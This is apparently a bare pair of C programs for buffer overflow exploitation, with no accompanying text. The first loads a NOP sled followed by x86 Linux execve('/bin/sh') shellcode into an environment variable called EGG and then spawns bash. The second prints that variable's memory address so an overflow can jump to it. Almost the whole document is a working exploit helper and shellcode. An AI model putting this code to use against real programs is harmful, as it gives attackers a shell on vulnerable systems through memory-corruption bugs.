#include <unistd.h>
#define NOP 0x90
 
char shellcode[] ="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90";
 
int main(void)
{
  char shell[512];
 
  puts("Eggshell loaded into environment.\n");
  memset(shell,NOP,512);     /* fill-up the buffer with NOP */
/* fill-up the shellcode on the second half to the end of buffer */
  memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
  /* set the environment variable to */
  /* EGG and shell as its value, rewrite if needed */
  setenv("EGG", shell, 1);
  /* modify the variable */
  putenv(shell);
  /* invoke the bash */
  system("bash");
  return 0;
}

#include <unistd.h>
 
int main(void)
{
  printf("EGG address: 0x%lx\n", getenv("EGG"));
  return 0;
}